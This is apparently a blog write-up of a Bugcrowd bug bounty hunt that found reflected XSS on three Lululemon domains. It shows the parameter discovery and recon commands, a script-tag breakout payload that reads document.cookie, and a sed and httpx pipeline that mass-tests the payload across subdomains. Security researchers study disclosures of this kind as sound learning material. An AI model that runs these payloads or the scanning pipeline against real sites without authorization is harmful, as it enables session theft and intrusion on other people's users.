# :globe_with_meridians: How I found 3 RXSS on Lululemon bug bounty program

---

# How I found 3 RXSS on Lululemon bug bounty program

Hi everybody, today i will show you how can simple technique lead you to find multiple series vulnerabilities across the whole subdomains

### Let’s start our story

While i was hunting on [Lululemon](https://bugcrowd.com/lululemon) program on Bugcrowd

I started to take a look on the main domain [https://www.lululemon.co.uk](https://www.lululemon.co.uk)

After i have spend some time on the main domain i started to do parameter brute force using [Arjun](https://github.com/s0md3v/Arjun)

>

┌──(omar㉿kali)-[~]
└─$ arjun -u [https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search -oT lululemon-parameters

The output file was look like that

>

┌──(omar㉿kali)-[~]
└─$ cat lululemon-parameters|qsreplace omar

requesting the link in browser found that q parameter value is reflected between double quotes inside script tag

`<script>some javascript code;var q="omar"; some javascript code;</script>`

i tried to get out of the double quote and injecting my payload inside script tag like this

>

[https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search?q=omar“;alert(domain);//

but the reflection was like that

`<script>some javascript code;var q="omar\";alert(domain);//"; some javascript code;</script>`

So it looks like that the developer bypass the quotes to prevent attackers to get out from the double quotes to not inject malicious code

What about open tag <

>

[https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search?q=omar<

the reflection was like that

`<script>some javascript code;var q="omar<"; some javascript code;</script>`

So I expected the developers used code in the backend to print the value of the q parameter like this

## Get Omar Hashem’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

`<?php echo(addslashes($_GET['q'])) ?>`

This means we can’t use quotes but we can close the script tag then open a new tag and write our javascript code in it

>

[https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search?q=</script><script>alert(document.cookie)</script>

### The first XSS on:

[https://www.lululemon.co.uk](https://www.lululemon.co.uk)

Usually when developers make a mistake there is a high possibility to make it on other places

So the next step is to test this XSS on the other domains and subdomains endpoints

### Simple Recon:

Passively collect endpoints with [gau](https://github.com/lc/gau) tool then using [uro](https://github.com/s0md3v/uro) tool to get unique endpoints, filter image, js, css and other static files

>

┌──(omar㉿kali)-[~]
└─$ cat subdomains.txt|gau |uro >endpoints.txt

Using sed command to add our “q” parameter to the all endpoints with url encoded payload “</script><script>alert(document.cookie)</script>” as a value

>

┌──(omar㉿kali)-[~]
└─$ sed -E -i “s/\?(.*)|$/\?q=%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E/g” endpoints.txt

Using httpx to request the endpoints and matching on our payload using argument -ms

>

┌──(omar㉿kali)-[~]
└─$ httpx -l endpoints.txt -ms “</script><script>alert(document.cookie)</script>”

And that was the results

### The second XSS on:

[https://www.lululemon.co](https://www.lululemon.co.uk)m.hk

### The third XSS on:

[https://www.eu.lululemon.co](https://www.lululemon.co.uk)m

## Stay in touch:[LinkedIn](https://www.linkedin.com/in/omar-1-hashem) | [Youtube](https://www.youtube.com/channel/UCJ1yNtgZP5LRO7ebZXSnAZQ/videos) | [Twitter](https://twitter.com/OmarHashem666)

---
